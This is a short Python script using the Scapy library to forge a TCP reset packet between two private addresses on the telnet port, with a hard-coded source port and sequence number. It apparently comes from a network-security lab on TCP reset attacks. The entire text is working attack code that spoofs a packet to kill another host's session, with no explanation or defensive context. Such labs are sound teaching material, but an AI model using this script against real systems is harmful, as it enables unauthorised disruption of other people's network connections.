#!/usr/bin/python3
from scapy.all import *

print("SENDING RESET PACKET.........")
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=51108, dport=23, seq=255127636, flags="R")
pkt = ip / tcp 
ls(pkt)
send(pkt, verbose=0)
